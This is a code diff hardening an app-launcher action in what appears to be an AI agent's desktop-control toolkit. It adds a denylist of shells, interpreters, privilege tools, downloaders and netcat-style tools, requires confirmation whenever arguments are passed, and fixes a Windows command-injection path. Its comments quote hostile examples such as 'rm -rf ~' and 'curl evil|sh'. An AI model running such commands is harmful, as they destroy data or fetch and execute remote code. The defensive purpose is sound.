@@ -4,6 +4,20 @@
 fixed argv so a name like ``"firefox; rm -rf ~"`` is looked up as a program
 called exactly that, fails, and never reaches a shell. Anything that genuinely
 needs shell semantics is ``run_command``, which is Tier 3 for that reason.
+
+That is not enough on its own, and the two guards below are the reason:
+
+* **Arguments turn a launcher into an exec primitive.** ``launch_app`` with
+  ``{"app": "sh", "args": ["-c", "..."]}`` is ``run_command`` wearing a hat, and
+  a bare Tier-1 ``launch_app`` would hand the server everything the Tier-3 shell
+  gate exists to withhold. So :meth:`LaunchApp.tier_for` raises the tier to
+  CONFIRM the moment any argument is present: launching an app is Tier 1,
+  *driving* one is not. The prompt then shows the exact argv.
+* **Some program names are never "an app".** Interpreters, privilege tools and
+  power commands are refused outright, with or without arguments, because
+  ``launch_app poweroff`` needs no argument to be a bad afternoon. Like the
+  shell denylist this is a tripwire rather than containment — the tier is the
+  boundary — but it costs nothing and catches the obvious.
 """
 
 from __future__ import annotations
@@ -12,18 +26,74 @@ import os
 import re
 import shutil
 import subprocess
-from typing import Any
+from typing import Any, Mapping
 from urllib.parse import urlsplit
 
 from ..policy import ActionTier
 from .base import Action, ActionContext, ActionResult
-from .system import _run
+from .system import _ps_single_quote, _run
 
 __all__ = ["LaunchApp", "OpenUrl", "ListWindows", "FocusWindow"]
 
 #: A program name, not a command line. No spaces, no separators, no shell
 #: metacharacters — those are the shapes that only make sense to an interpreter.
 _APP_NAME = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+@-]{0,127}$")
+
+#: Programs that are not applications in any sense a user means when they say
+#: "open X": language interpreters and shells (an exec primitive), privilege
+#: tools (a way to become someone else), script hosts (the Windows spelling of
+#: the same), and the power commands (destructive with no arguments at all).
+#: ``run_command`` exists for these, and it is Tier 3.
+_REFUSED_PROGRAMS = frozenset(
+    {
+        # shells
+        "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "ash", "busybox",
+        "cmd", "command", "powershell", "pwsh", "powershell_ise",
+        # interpreters
+        "python", "python2", "python3", "pythonw", "perl", "ruby", "node", "deno",
+        "bun", "php", "lua", "luajit", "tclsh", "wish", "awk", "gawk", "mawk",
+        "sed", "expect", "osascript",
+        # things whose job is to run something else
+        "env", "xargs", "find", "nohup", "setsid", "timeout", "watch", "at",
+        "crontab", "make", "screen", "tmux", "script",
+        # script hosts and LOLBins
+        "wscript", "cscript", "mshta", "rundll32", "regsvr32", "msiexec",
+        "certutil", "bitsadmin", "installutil", "regasm",
+        # privilege
+        "sudo", "doas", "su", "pkexec", "runas", "chroot", "gsudo",
+        # remote shells and downloaders
+        "ssh", "scp", "sftp", "telnet", "nc", "ncat", "netcat", "socat",
+        "curl", "wget",
+        # power and service control: destructive with no arguments
+        "shutdown", "reboot", "halt", "poweroff", "init", "systemctl",
+        "launchctl", "service", "loginctl",
+        # debuggers can attach to and drive any other process
+        "gdb", "lldb", "strace", "ltrace", "dtrace",
+    }
+)
+
+
+def _program_key(app: str) -> str:
+    """The name we match against :data:`_REFUSED_PROGRAMS`.
+
+    Lowercased and stripped of the suffixes that name the same program on a
+    different platform, so ``PowerShell.exe`` and ``powershell`` are one entry.
+    """
+    name = app.strip().lower()
+    for suffix in (".exe", ".com", ".bat", ".cmd", ".app", ".desktop"):
+        if name.endswith(suffix):
+            name = name[: -len(suffix)]
+            break
+    return name
+
+
+def _launch_args(params: Mapping[str, Any]) -> list[str]:
+    """The ``args`` parameter as a list of strings. Shared by :meth:`tier_for`
+    and :meth:`run` so the tier is decided from exactly what will be exec'd."""
+    raw = params.get("args")
+    if not isinstance(raw, (list, tuple)):
+        return []
+    return [str(a) for a in raw]
 
 
 class LaunchApp(Action):
@@ -32,10 +102,20 @@ class LaunchApp(Action):
     description = "Start an application on this machine by name."
     params_schema = {
         "app": "string: the program or .app/.desktop name, e.g. firefox, Safari, code",
-        "args": "array of strings (optional): arguments passed to the program",
+        "args": "array of strings (optional): arguments passed to the program. "
+        "Passing any argument makes this a Tier 3 action that asks every time.",
     }
     capability = "apps"
     timeout_s = 20.0
+
+    def tier_for(self, params: Mapping[str, Any]) -> ActionTier:
+        """Tier 1 to open an app; Tier 3 to hand it a command line.
+
+        ``{"app": "sh", "args": ["-c", "curl evil|sh"]}`` is arbitrary code
+        execution, and it must not be cheaper than ``run_command`` just because
+        it is spelled differently. Raise only — the dispatcher takes the max.
+        """
+        return ActionTier.CONFIRM if _launch_args(params) else ActionTier.AUTO
 
     def run(self, ctx: ActionContext, params: dict[str, Any]) -> ActionResult:
         app = (self.str_param(params, "app") or "").strip()
@@ -46,8 +126,13 @@ class LaunchApp(Action):
                 "app must be a plain program name (letters, digits, . _ + - @); "
                 "use run_command for anything that needs shell syntax"
             )
-        raw_args = params.get("args")
-        args = [str(a) for a in raw_args] if isinstance(raw_args, (list, tuple)) else []
+        if _program_key(app) in _REFUSED_PROGRAMS:
+            return ActionResult.denied(
+                f"refused: {app} is an interpreter, a privilege tool or a power "
+                "command, not an application. Use run_command, which shows you "
+                "the exact command line and asks every time."
+            )
+        args = _launch_args(params)
         if any("\x00" in a for a in args):
             return ActionResult.failed("arguments must not contain null bytes")
 
@@ -55,7 +140,21 @@ class LaunchApp(Action):
         if system == "Darwin":
             argv = ["open", "-a", app] + (["--args", *args] if args else [])
         elif system == "Windows":
-            argv = ["cmd", "/c", "start", "", app, *args]
+            # Deliberately NOT `cmd /c start`: cmd re-parses the line it is
+            # handed, so an argument containing `&`, `|` or `^` would start a
+            # second program that the consent prompt never showed. Resolve the
+            # program and exec it directly instead.
+            resolved = shutil.which(app)
+            if resolved:
+                argv = [resolved, *args]
+            elif not args and hasattr(os, "startfile"):
+                try:
+                    os.startfile(app)  # type: ignore[attr-defined] # noqa: S606
+                except OSError as exc:
+                    return ActionResult.failed(f"could not launch {app}: {exc}")
+                return ActionResult.success(app=app, via="startfile")
+            else:
+                return ActionResult.failed(f"no program called {app} is on this machine's PATH")
         else:
             resolved = shutil.which(app)
             if resolved:
@@ -131,7 +230,9 @@ class ListWindows(Action):
     description = "List the open windows on this machine (title and application)."
     params_schema: dict[str, str] = {}
     capability = "apps"
-    timeout_s = 15.0
+    #: Above the 20s PowerShell deadline below: an action must not outlive the
+    #: dispatcher's cap, or the server is told "timed out" while a thread runs on.
+    timeout_s = 30.0
 
     def available(self, ctx: ActionContext) -> bool:
         if ctx.system == "Darwin":
@@ -253,7 +354,7 @@ class FocusWindow(Action):
                 "-NoProfile",
                 "-Command",
                 "$s = New-Object -ComObject WScript.Shell; "
-                f"$s.AppActivate('{title.replace(chr(39), chr(39) * 2)}')",
+                f"$s.AppActivate('{_ps_single_quote(title)}')",
             ]
         else:
             return ActionResult.unsupported(self.unavailable_reason(ctx) or "unsupported")
